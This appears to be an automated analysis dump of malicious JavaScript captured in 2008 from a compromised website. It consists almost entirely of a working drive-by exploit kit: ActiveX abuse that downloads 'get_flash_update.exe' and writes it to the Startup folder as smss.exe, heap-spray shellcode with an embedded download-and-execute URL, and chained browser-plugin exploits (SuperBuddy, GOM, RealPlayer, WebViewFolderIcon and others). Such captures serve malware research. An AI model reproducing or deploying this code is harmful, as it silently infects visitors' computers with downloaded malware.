// Monkeywrench run Wed Jul 30 17:04:55 2008
// -----------------------------------------------
// Set up a document object
// -----------------------------------------------
document.location.href = 'http://www.baeckerei-sedlmaier.de/1.html'

// -----------------------------------------------
// inline script:
// -----------------------------------------------
ZUgZJXG();
function ZUgZJXG() {
   KglUBuK = document.location.href.replace(/1.html/ig, '') + 'get_flash_update.exe';
   var OQgDOuD = document.createElement('object');
   OQgDOuD.setAttribute('id', 'OQgDOuD');
   OQgDOuD.setAttribute('classid', 'clsid:BD96C556-65A3-11D0-983A-00C04FC29E36');
   try {
      var dXlOmxJ = document.createElement('object');
      dXlOmxJ.setAttribute('id', 'dXlOmxJ');
      dXlOmxJ.setAttribute('classid', 'clsid:F0E42D50-368C-11D0-AD81-00A0C90DC8D9');
      var AxclEnf = 'C:/Documents and Settings/All Users/Start Menu/Programs/Startup/smss.exe';
      dXlOmxJ.SnapshotPath = KglUBuK;
      dXlOmxJ.CompressedPath = AxclEnf;
      eval(dXlOmxJ.PrintSnapshot());
   } catch(JgsOOiI) {}
   try {
      var fHQTyXx = OQgDOuD.CreateObject('msxml2.XMLHTTP', '');
      var BKPYHiu = OQgDOuD.CreateObject('Shell.Application', '');
      var nrbromf = OQgDOuD.CreateObject('adodb.stream', '');
      try {
         eval(nrbromf.type = 1);
         eval(fHQTyXx.open('GET', KglUBuK, false));
         eval(fHQTyXx.send());
         eval(nrbromf.open());
         nrbromf.Write(fHQTyXx.responseBody);
         var zIPafSm = './/..//wXtwRzv.exe';
         eval(nrbromf.savetofile(zIPafSm, 2));
         eval(nrbromf.close());
      } catch(JgsOOiI) {}
      try {
         eval(BKPYHiu.shellexecute(zIPafSm));
      } catch(JgsOOiI) {}
   } catch(JgsOOiI) {}
}
// -----------------------------------------------
// script ends
// -----------------------------------------------
// -----------------------------------------------
// inline script:
// -----------------------------------------------
var nggByhS = 0x0c0c0c0c;
function Gslide(spraySlide, saruuysaddize) {
   while (spraySlide.length * 2 < saruuysaddize) {
      spraySlide += spraySlide;
   }
   spraySlide = spraySlide.substring(0, saruuysaddize / 2);
   return spraySlide;
}
url = document.location.href.replace(/1.html/ig, '') + 'get_flash_update.exe';
var outValue = '';
for (i = 0; i < url.length;) {
   outValue += '%u' + url.charCodeAt(i + 1).toString(16) + url.charCodeAt(i).toString(16);
   i = i + 2;
}
outValue += '%u0000';
var Shellcode = unescape("%u4343%u4343%u0feb%u335b%u66c9%u80b9%u8001%uef33%ue243%uebfa%ue805%uffec%uffff%u8b7f%udf4e%uefef%u64ef%ue3af%u9f64%u42f3%u9f64%u6ee7%uef03%uefeb%u64ef%ub903%u6187%ue1a1%u0703%uef11%uefef%uaa66%ub9eb%u7787%u6511%u07e1%uef1f%uefef%uaa66%ub9e7%uca87%u105f%u072d%uef0d%uefef%uaa66%ub9e3%u0087%u0f21%u078f%uef3b%uefef%uaa66%ub9ff%u2e87%u0a96%u0757%uef29%uefef%uaa66%uaffb%ud76f%u9a2c%u6615%uf7aa%ue806%uefee%ub1ef%u9a66%u64cb%uebaa%uee85%u64b6%uf7ba%u07b9%uef64%uefef%u87bf%uf5d9%u9fc0%u7807%uefef%u66ef%uf3aa%u2a64%u2f6c%u66bf%ucfaa%u1087%uefef%ubfef%uaa64%u85fb%ub6ed%uba64%u07f7%uef8e%uefef%uaaec%u28cf%ub3ef%uc191%u288a%uebaf%u8a97%uefef%u9a10%u64cf%ue3aa%uee85%u64b6%uf7ba%uaf07%uefef%u85ef%ub7e8%uaaec%udccb%ubc34%u10bc%ucf9a%ubcbf%uaa64%u85f3%ub6ea%uba64%u07f7%uefcc%uefef%uef85%u9a10%u64cf%ue7aa%ued85%u64b6%uf7ba%uff07%uefef%u85ef%u6410%uffaa%uee85%u64b6%uf7ba%uef07%uefef%uaeef%ubdb4%u0eec%u0eec%u0eec%u0eec%u036c%ub5eb%u64bc%u0d35%ubd18%u0f10%u64ba%u6403%ue792%ub264%ub9e3%u9c64%u64d3%uf19b%uec97%ub91c%u9964%ueccf%udc1c%ua626%u42ae%u2cec%udcb9%ue019%uff51%u1dd5%ue79b%u212e%uece2%uaf1d%u1e04%u11d4%u9ab1%ub50a%u0464%ub564%ueccb%u8932%ue364%u64a4%uf3b5%u32ec%ueb64%uec64%ub12a%u2db2%uefe7%u1b07%u1011%uba10%ua3bd%ua0a2%uefa1" + outValue);
var hadttdtSize = 0x400000;
var payfdLytyusade = Shellcode.length * 2;
var tggter = payfdLytyusade + 0x38;
var saruuysaddize = hadttdtSize - tggter;
var spraySlide = unescape("%u0c0c%u0c0c");
var prrerat = new Array();
spraySlide = Gslide(spraySlide, saruuysaddize);
var kilrrer = nggByhS - 0x400000;
hsttiicks = kilrrer / hadttdtSize;
for (i = 0; i < hsttiicks; i++) {
   prrerat[i] = spraySlide + Shellcode;
}
function startCreateControlRange() {
   ugric = unescape("%u0d0d%u0d0d");
   var xYz = 0x40000;
   while (ugric.length < xYz) ugric += ugric;
   ugric = ugric.substring(0, 0x3ffe4 - Shellcode.length);
   bublic = new Array();
   for (i = bublic; i < 450; i++) bublic[i] = ugric + Shellcode;
   mceil = Math.ceil(0xd0d0d0d);
   document.write('<object classid="CLSID:EC444CB6-3E7E-4865-B1C3-0DE72EF39B3F"></object>');
   try {
      mceil = document.scripts[0].createControlRange().length;
   } catch(e) {}
   setTimeout("startSuperBuddy()", 3000);
}
function startSuperBuddy() {
   try {
      var buddy = new ActiveXObject('Sb.SuperBuddy.1');
      if (buddy) {
         buddy.LinkSBIcons(0x0c0c0c0c);
      }
   } catch(e) {}
   setTimeout("startAudioFile()", 2000);
}
function startAudioFile() {
   try {
      var mmed = document.createElement('object');
      mmed.setAttribute('classid', 'clsid:77829F14-D911-40FF-A2F0-D11DB8D6D0BC');
      var mms = '';
      for (var i = 0; i < 4120; i++) {
         mms += 'A';
      }
      mms += '';
      mmed.SetFormatLikeSample(mms);
   } catch(e) {}
   setTimeout("startGOM()", 2000);
}
function startGOM() {
   var sURL = '';
   for (var i = 0; i < 510; i++) {
      sURL += unescape("%0c");
   }
   try {
      var GomManager = new ActiveXObject('GomWebCtrl.GomManager.1');
      GomManager.OpenURL(sURL);
   } catch(e) {}
   setTimeout("startRealPlayer()", 2000);
}
function startRealPlayer() {
   try {
      var rpl = document.createElement('object'),
      adt = '';
      rpl.setAttribute('classid', 'clsid:2F542A2E-EDC9-4BF7-8CB1-87C9919F7F93');
      for (var i = 0; i < 32; i++) {
         adt = adt + unescape("%0C");
      }
      for (i = 0; i < 5; i++) {
         rbt = rpl.Console;
         rpl.Console = adt;
         rpl.Console = rbt;
      }
      setTimeout("startWVF()", 2000);
   } catch(e) {}
}
function startWVF() {
   for (i = 0; i < 128; i++) {
      try {
         var tar = new ActiveXObject('WebViewFolderIcon.WebViewFolderIcon.1');
         tar.setSlice(0x7ffffffe, 0x05050505, 0x05050505, 0x05050505);
      } catch(e) {}
   }
}
startCreateControlRange();
// -----------------------------------------------
// script ends
// -----------------------------------------------

